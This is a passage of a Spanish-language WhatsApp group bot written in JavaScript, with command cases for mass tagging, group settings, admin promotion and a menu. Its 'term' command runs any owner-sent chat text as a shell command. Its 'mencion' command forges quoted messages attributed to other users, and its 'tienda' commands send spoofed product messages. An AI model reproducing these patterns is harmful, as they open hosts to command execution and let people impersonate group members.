          kev.sendMessage(from, thumb, MessageType.image, {quoted: vin, caption: 'Perfil Descargado.'})
        }
        break
case 'tienda':
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
imeu2 = await kev.prepareMessage('0@s.whatsapp.net', fakeimg, MessageType.image)
imeg = imeu2.message.imageMessage
  res = await kev.prepareMessageFromContent(from,{
  "productMessage": {
    "product": {
      "productImage": imeg,
      "productId": "4362285483807226",
      "title": `${args}`,
      "currencyCode": "US$",
      "priceAmount1000": "111111111",
      "productImageCount": 1
    },
    "businessOwnerJid": "50768666666@s.whatsapp.net",
    "contextInfo": {
      "forwardingScore": 999999,
      "isForwarded": true
    }
  }
}, {quoted:faketroli, sendEphemeral: true, contextInfo:{ forwardingScore: 999999, isForwarded: true}}) 

kev.relayWAMessage(res)
break
case 'tienda2':
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
if (!isQuotedImage) return reply('Menciona una imagen')
var buferium = JSON.parse(JSON.stringify(vin).replace("quotedM", "m")).message.extendedTextMessage.contextInfo
var buf = await kev.downloadAndSaveMediaMessage(buferium) 
inu_buffer = fs.readFileSync(buf)
imeu2 = await kev.prepareMessage('0@s.whatsapp.net', inu_buffer, MessageType.image)
imeg = imeu2.message.imageMessage
  res = await kev.prepareMessageFromContent(from,{
  "productMessage": {
    "product": {
      "productImage": imeg,
      "productId": "4362285483807226",
      "title": `${args}`,
      "currencyCode": "US$",
      "priceAmount1000": "777777777",
      "productImageCount": 1
    },
    "businessOwnerJid": "50768666666@s.whatsapp.net",
    "contextInfo": {
      "forwardingScore": 999999,
      "isForwarded": true
    }
  }
}, {quoted:faketroli, sendEphemeral: true}) 

kev.relayWAMessage(res)
break
/// OWNER
case 'term':
if (!yo && !isOwner) return 
  const cmd = (q)
exec(cmd, (err, stdout) => {
  if(err) return kev.sendMessage(from, `Root Term\n ${err}`, MessageType.text, fakevin)
  if (stdout) {
  kev.sendMessage(from, stdout, MessageType.text, fakevin)
    }
  })
  break
case 'internet':
            if (!yo && !isOwner) return 
            reply('🕰️ *ᴇsᴘᴇʀᴀ ᴇɴ ᴘʀᴏᴄᴇsᴏ...*')
          kev.updatePresence(from, Presence.composing) 
           exec("speedtest-cli", (err, o) => {
           if(err) return reply(err)
           if (o) {
           kev.sendMessage(from, o, MessageType.text, {quoted: vin, contextInfo: {"mentionedJid": [m.participant],externalAdReply : { title : `凯文安东尼奥`, body : "Jazz Del Resultado....", mediaType: 2, thumbnail: fakeimg, mediaUrl : `https://youtu.be/wjh2gav5a48`}}})
           }
         })
          break
case 'fix':
            if (!yo && !isOwner) return 
          kev.updatePresence(from, Presence.composing) 
           exec("git pull", (err, stdout) => {
           if(err) return reply(err)
           if (stdout) {
           reply(`Sistema Fixeado:\n\n${stdout}`)
           }
         })
          break
case 'reiniciar':
if (!yo && !isOwner) return 
reply('Sistema Reiniciado')
await sleep(1000)
terminate(process.pid, function (err) {
  if (err) { // you will get an error if you did not supply a valid process.pid
    console.log("Oopsy: " + err); // handle errors in your preferred way.
  }
  else {
    console.log('done'); // terminating the Processes succeeded.
  }
});
break


/// MENCIONES
            case 'noti':
if (!isGroupAdmins) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
                  if (!arg) return reply(`Para crear una notificación usa el comando *${prefix}noti texto*`)
                  enpai = `*Hey tenemos una notificación para ti....*\n\n*Notificación:* ${arg}\n\n*Atentamente: @${senderfix.split("@")[0]}*`
                  let dec = await kev.groupMetadata(from)
                  let members = dec.participants
                  let deca = []
                  for (let i of members){
                  deca.push(i.jid)
                  }
                  options = {
                  contextInfo: {
                  mentionedJid: dec
                  },
                  quoted : faketroli
                  }
                  kev.sendMessage(from, enpai, MessageType.text, {quoted : faketroli, contextInfo: {"mentionedJid": deca}}, arg)
            break
    case 'mencion':
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
            if (args.length < 1) return reply(`Uso :\n${prefix}mencion @usuario|texto del usuario|respuesta del bot\n\nEjemplo: \n${prefix}mencion @usuario|Hola bot|Como estas`)
            var gh = (q)
            mentioned = vin.message.extendedTextMessage.contextInfo.mentionedJid
            var replace = gh.split("|")[0];
            var target = gh.split("|")[1];
            var bot = gh.split("|")[2];
            kev.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
            break
    case 'tagcontacto':
if (!isGroupAdmins) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
            pe = args.join('')
            entah = pe.split('|')[0]
            nah = pe.split('|')[1]
            if (isNaN(entah)) return reply(`Número de telefono invalido, intenta hacerlo asi: *${prefix}tagcontacto 50768666666|Kevin*`);
            members_ids = []
            for (let mem of groupMembers) {
            members_ids.push(mem.jid)
            }
            vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n'
            + `FN:${nah}\n`
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            kev.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
            break
    case 'hidetag':
if (!isGroupAdmins) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
            var value = args.join(' ')
            var group = await kev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var optionshidetag = {
            text: value,
            contextInfo: { mentionedJid: mem },
            quoted: vin
            }
            kev.sendMessage(from, optionshidetag, text)
            break
case 'tag':
if (!isGroupAdmins) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
            if ((isMedia && !vin.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmediax3 = isQuotedSticker ? JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : vin
            filex3 = await kev.downloadAndSaveMediaMessage(encmediax3, filename = getRandom())
            value = args.join(" ")
            var group = await kev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: vin
            }
            ini_buffer = fs.readFileSync(filex3)
            kev.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(filex3)
            } else if ((isMedia && !vin.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmediax4 = isQuotedImage ? JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : vin
            file4 = await kev.downloadAndSaveMediaMessage(encmediax4, filename = getRandom())
            value = args.join(" ")
            var group = await kev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: vin
            }
            ini_buffer = fs.readFileSync(file4)
            kev.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file4)
        } else if ((isMedia && !vin.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmediax1 = isQuotedAudio ? JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : vin
            filex1 = await kev.downloadAndSaveMediaMessage(encmediax1, filename = getRandom())
            value = args.join(" ")
            var group = await kev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'audio/mp4',
                ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: vin
            }
            ini_buffer = fs.readFileSync(filex1)
            kev.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(filex1)
        }  else if ((isMedia && !vin.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmediax2 = isQuotedVideo ? JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : vin
            filex2 = await kev.downloadAndSaveMediaMessage(encmediax2, filename = getRandom())
            value = args.join(" ")
            var group = await kev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: vin
            }
            ini_buffer = fs.readFileSync(filex2)
            kev.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(filex2)
        } else{
          kev.sendMessage(from, `Menciona un sticker/imagen/video/audio junto al comando *${prefix}totag*` , MessageType.text, fakevin)
        }
        break
case 'tagimagen':
if (!isGroupAdmins) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
        if ((isMedia && !vin.message.videoMessage || isQuotedImage)) {
      let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(vin).replace('quotedM','m')).message.extendedTextMessage.contextInfo : vin
      let media = await kev.downloadMediaMessage(encmedia)
      hideTagImg(from, media, vin)
      } else {
      reply(`Para crear una mención de todos los usuarios dentro de una imagen\nsolamente envia o menciona la imagen junto al comando: *${prefix}tagimagen*`)
      }
        break
        case 'tagaudio':
        if (!isGroupAdmins) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
            if ((isMedia && !vin.message.videoMessage || isQuotedAudio) && args.length == 0) {
            encmedia22 = isQuotedAudio ? JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : vin
            file22 = await kev.downloadAndSaveMediaMessage(encmedia22, filename = getRandom())
            var group = await kev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
              mimetype : 'audio/mp4',
              ptt : true,
                contextInfo: { mentionedJid: mem },
                quoted: vin
            }
            ini_buffer = fs.readFileSync(file22)
            kev.sendMessage(from, ini_buffer, audio, options, {quoted: vin})
            fs.unlinkSync(file22)
            }
            break
        case 'tagvideo':
        if (!isGroupAdmins) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
        if ((isMedia && !vin.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia23 = isQuotedVideo ? JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : vin
            file23 = await kev.downloadAndSaveMediaMessage(encmedia23, filename = getRandom())
            var group = await kev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
              mimetype : 'video/mp4',
                contextInfo: { mentionedJid: mem },
                quoted: vin
            }
            ini_buffer = fs.readFileSync(file23)
            kev.sendMessage(from, ini_buffer, video, options, {quoted: vin})
            fs.unlinkSync(file23)
            }
        break
        case 'taggif':
        if (!isGroupAdmins) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
        if ((isMedia && !vin.message.videoMessage || isQuotedVideo) && args.length == 0) {
            encmedia23 = isQuotedVideo ? JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : vin
            file23 = await kev.downloadAndSaveMediaMessage(encmedia23, filename = getRandom())
            var group = await kev.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
              mimetype : 'video/gif',
                contextInfo: { mentionedJid: mem },
                quoted: vin
            }
            ini_buffer = fs.readFileSync(file23)
            kev.sendMessage(from, ini_buffer, video, options, {quoted: vin})
            fs.unlinkSync(file23)
            }
        break
        case 'tagapk':
        if (!isGroupAdmins) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
                if (!isQuotedDocument) return reply(`Menciona un archivo apk para volverlo mencion junto el comando: *${prefil}tagapk*`)
                quoted = JSON.parse(JSON.stringify(vin).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                download = await kev.downloadMediaMessage(quoted)
                await fs.writeFileSync(`doc.apk`, download)
                var group = await kev.groupMetadata(from)
                var member = group['participants']
                var mem = []
                member.map(async adm => {
                mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
                })
                kev.sendMessage(from, fs.readFileSync(`doc.apk`), document, { contextInfo: {mentionedJid: mem }, quoted: vin, filename: 'kev.apk', mimetype: 'application/vnd.android.package-archive'})
                await fs.unlinkSync(`doc.apk`)
                break


/// CONFIGURACION DEL GRUPO
    case 'hablen':
    if (!BAdmin) return reply('❬❗❭ *_Pᴏʀ ᴏʙᴠɪᴀs ʀᴀᴢᴏɴᴇs ᴇʟ ʙᴏᴛ ɴᴇᴄᴇsɪᴛᴀ sᴇʀ ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀ ᴘᴀʀᴀ ʀᴇᴀʟɪᴢᴀʀ ᴇsᴛᴀ ᴀᴄᴄɪᴏ́ɴ.._*')
if (!isGroupAdmins) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
          kev.groupSettingChange(from, GroupSettingChange.messageSend, false)
        break
        case 'silencio':
        if (!BAdmin) return reply('❬❗❭ *_Pᴏʀ ᴏʙᴠɪᴀs ʀᴀᴢᴏɴᴇs ᴇʟ ʙᴏᴛ ɴᴇᴄᴇsɪᴛᴀ sᴇʀ ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀ ᴘᴀʀᴀ ʀᴇᴀʟɪᴢᴀʀ ᴇsᴛᴀ ᴀᴄᴄɪᴏ́ɴ.._*')
if (!isGroupAdmins) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
kev.groupSettingChange(from, GroupSettingChange.messageSend, true)
        break
        case 'enlace':
        if (!BAdmin) return reply('❬❗❭ *_Pᴏʀ ᴏʙᴠɪᴀs ʀᴀᴢᴏɴᴇs ᴇʟ ʙᴏᴛ ɴᴇᴄᴇsɪᴛᴀ sᴇʀ ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀ ᴘᴀʀᴀ ʀᴇᴀʟɪᴢᴀʀ ᴇsᴛᴀ ᴀᴄᴄɪᴏ́ɴ.._*')
if (!isGroupAdmins) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
      linkgc = await kev.groupInviteCode (from)
            yeh = `Nombre: *${groupName}*\n\nUsuarios: *${groupMembers.length}*\n\nAdministradores: *${groupAdmins.length}*\n\nEnlace: *https://chat.whatsapp.com/${linkgc}*`
            kev.sendMessage(from, yeh, MessageType.text, fakevin)
        break
    case 'admin':
    case 'up':
    case 'promote':
    if (!BAdmin) return reply('❬❗❭ *_Pᴏʀ ᴏʙᴠɪᴀs ʀᴀᴢᴏɴᴇs ᴇʟ ʙᴏᴛ ɴᴇᴄᴇsɪᴛᴀ sᴇʀ ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀ ᴘᴀʀᴀ ʀᴇᴀʟɪᴢᴀʀ ᴇsᴛᴀ ᴀᴄᴄɪᴏ́ɴ.._*')
if (!isGroupAdmins) return reply('❬❗❭ *_Esᴛᴇ ᴄᴏᴍᴀɴᴅᴏ sᴏʟᴏ ᴇsᴛᴀ ᴅɪsᴘᴏɴɪʙʟᴇs ᴘᴀʀᴀ ʟᴏs ᴀᴅᴍɪɴɪsᴛʀᴀᴅᴏʀᴇs..._*')
if (!isGroup)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
      if (!arg) return reply(`*Para darle administración a un usuario usa el comando: ${prefix}up @usuario o tambien puedes usar su numero ejemplo: ${prefix}up 50766666666*`)
      if (vin.message.extendedTextMessage != undefined){
            mentioned = vin.message.extendedTextMessage.contextInfo.mentionedJid
            promote2 = `*Listo Ahora El Usuario Es Un Administrador.*`
      kev.sendMessage(from, promote2, MessageType.text, fakevin)
      promote(from, mentioned)
      } else {
      kev.sendMessage(from, promote2, MessageType.text, fakevin)
      promote(from, [args[0] + '@s.whatsapp.net'])
      }
    break
/*case 'menu':
if (!isGroup && !yo)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
var wstatus = await kev.getStatus(sender, MessageType.text)
runtmenusito = process.uptime()
let runtt = runtime(runtmenusito)
let manuri = await kev.chats.all()
        let i2 = []
        let giiid = []
        for (let mem of manuri){
          i2.push(mem.jid)
        }
        for (let id of i2){
          if (id && id.includes('g.us')){
            giiid.push(id)
          }
        }
menux = `⦿ Que tengas ${tengas}
⦿ Fecha Actual :  ${tampilTanggal}

*REPORTAR BUGS*
⚠️ ${prefix}?
⚠️ ${prefix}bug
⚠️ ${prefix}reporte

*DESCARGAS*
📥 ${prefix}igdl
📥 ${prefix}tiktok
📥 ${prefix}twitter
📥 ${prefix}facebook
📥 ${prefix}mediafire
📥 ${prefix}ighistoria

*BUSQUEDA*
⚔️ ${prefix}xnxx
⚔️ ${prefix}phub
⚔️ ${prefix}imagen
⚔️ ${prefix}wattpad
⚔️ ${prefix}ytbusqueda
⚔️ ${prefix}pinterest
⚔️ ${prefix}playstore

*STALKING*
🕯️ ${prefix}igstalk
🕯️ ${prefix}tiktokstalk

*CREADORES*
*𝕷⃝🧇 ∙* _${prefix}zalgo
*𝕷⃝🧇 ∙* _${prefix}emoji
*𝕷⃝🧇 ∙* _${prefix}texto
*𝕷⃝🧇 ∙* _${prefix}toimg
*𝕷⃝🧇 ∙* _${prefix}tomp4
*𝕷⃝🧇 ∙* _${prefix}tourl
*𝕷⃝🧇 ∙* _${prefix}robar
*𝕷⃝🧇 ∙* _${prefix}sticker
*𝕷⃝🧇 ∙* _${prefix}sticker2

*MÚSICA DESCARGA*
*𝕷⃝🧇 ∙* _${prefix}ytdl
*𝕷⃝🧇 ∙* _${prefix}ytmp3
*𝕷⃝🧇 ∙* _${prefix}ytmp4
*𝕷⃝🧇 ∙* _${prefix}youfix
*𝕷⃝🧇 ∙* _${prefix}playmp4
*𝕷⃝🧇 ∙* _${prefix}playmp3

*EFECTOS AUDIO/VIDEO*
*𝕷⃝🧇 ∙* _${prefix}bass
*𝕷⃝🧇 ∙* _${prefix}lento
*𝕷⃝🧇 ∙* _${prefix}rapido
*𝕷⃝🧇 ∙* _${prefix}reversa
*𝕷⃝🧇 ∙* _${prefix}volumen
*𝕷⃝🧇 ∙* _${prefix}fantasma
*𝕷⃝🧇 ∙* _${prefix}monstruo
*𝕷⃝🧇 ∙* _${prefix}lentocore
*𝕷⃝🧇 ∙* _${prefix}nightcore
🎥 ${prefix}camaralenta
🎥 ${prefix}camararapida
🎥 ${prefix}camarareversa

*JUEGOS*
🕹️ ${prefix}xo
🕹️ ${prefix}reiniciarxo
🕹️ ${prefix}cs
🕹️ ${prefix}dado

*HERRAMIENTAS*
*𝕷⃝🧇 ∙* _${prefix}ocr
*𝕷⃝🧇 ∙* _${prefix}tomp3
*𝕷⃝🧇 ∙* _${prefix}get64
*𝕷⃝🧇 ∙* _${prefix}gethex
*𝕷⃝🧇 ∙* _${prefix}perfil
*𝕷⃝🧇 ∙* _${prefix}captura
*𝕷⃝🧇 ∙* _${prefix}leermas
*𝕷⃝🧇 ∙* _${prefix}contacto
*𝕷⃝🧇 ∙* _${prefix}inspeccionar

*EXTRA*
*𝕷⃝🧇 ∙* _${prefix}speed
*𝕷⃝🧇 ∙* _${prefix}tienda
*𝕷⃝🧇 ∙* _${prefix}tienda2
*𝕷⃝🧇 ∙* _${prefix}fakeloc
*𝕷⃝🧇 ∙* _${prefix}fakepdf
*𝕷⃝🧇 ∙* _${prefix}runtime
*𝕷⃝🧇 ∙* _${prefix}creador

*MENCIONES*
*𝕷⃝🧇 ∙* _${prefix}tag
*𝕷⃝🧇 ∙* _${prefix}noti
*𝕷⃝🧇 ∙* _${prefix}taggif
*𝕷⃝🧇 ∙* _${prefix}tagapk
*𝕷⃝🧇 ∙* _${prefix}hidetag
*𝕷⃝🧇 ∙* _${prefix}mencion
*𝕷⃝🧇 ∙* _${prefix}tagvideo
*𝕷⃝🧇 ∙* _${prefix}tagaudio
*𝕷⃝🧇 ∙* _${prefix}tagimagen
*𝕷⃝🧇 ∙* _${prefix}tagcontacto

*ADMINS*
🧇 ${prefix}echar
🧇 ${prefix}sider
🧇 ${prefix}fotog
🧇 ${prefix}descg
🧇 ${prefix}online
🧇 ${prefix}viewto
🧇 ${prefix}demote
🧇 ${prefix}enlace
🧇 ${prefix}hablen
🧇 ${prefix}nombreg
🧇 ${prefix}promote
🧇 ${prefix}votacion
🧇 ${prefix}unavista
🧇 ${prefix}silencio
🧇 ${prefix}antidelete
🧇 ${prefix}bienvenida
🧇 ${prefix}antiarabes
🧇 ${prefix}antienlace
🧇 ${prefix}delvotacion
🧇 ${prefix}antihidetag
🧇 ${prefix}antiextranjeros

*INFO DEL BOT*
🔖 Prefix : 「 ${prefix} 」
🔖 Runtime : ${runtt}
🔖 Lib :  Baileys
🔖 Usos :  ${hit_today.length}
🔖 Grupos Totales : ${giiid.length} Grupos
🔖 Mensajes Personales : ${manuri.length - giiid.length} Mensajes
🔖 Chats Totales : ${manuri.length} Chats`
loc = {
            "degreesLatitude": 0,
            "degreesLongitude": 0,
            "jpegThumbnail": fakeimg
            }
            kev.sendMessage(from, 
            {"contentText": `        Hola @${senderfix.split('@')[0]} 🌈 `,
            "footerText": `${menux}`,
            "buttons": [
            {"buttonId": `${prefix}info`,
            "buttonText": {"displayText": "🧇 THANKS TO 🧇"
            },"type": "RESPONSE"},
            {"buttonId": `${prefix}creador`,
            "buttonText": {"displayText": "🧇 CREADOR 🧇"
            },"type": "RESPONSE"}
            ], "headerType": 6,
            "locationMessage": loc,
            quoted: null
            }, MessageType.buttonsMessage, {contextInfo: {mentionedJid: [senderfix]}})
break*/
case 'menu':
if (!isGroup && !vin.key.fromMe)return reply('❬❗❭ *_Lᴏ ʟᴀᴍᴇɴᴛᴏ... ᴇʟ ʙᴏᴛ ɴᴏ ғᴜɴᴄɪᴏɴᴀ ᴇɴ ᴄʜᴀᴛs ᴘʀɪᴠᴀᴅᴏs......_*')
var wstatus = await kev.getStatus(sender, MessageType.text)
var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 500 / 500)}MB`
runtmenusitoo = process.uptime()
let runttt = runtime(runtmenusitoo)
let manurii = await kev.chats.all()
        let i3 = []
        let giiiid = []
        for (let mem of manurii){
          i3.push(mem.jid)
        }
        for (let id of i3){
          if (id && id.includes('g.us')){
            giiiid.push(id)
          }
        }
menuxx = `⦿ Que Tengas ${tengas}
⦿ Fecha Actual :  ${tampilTanggal}

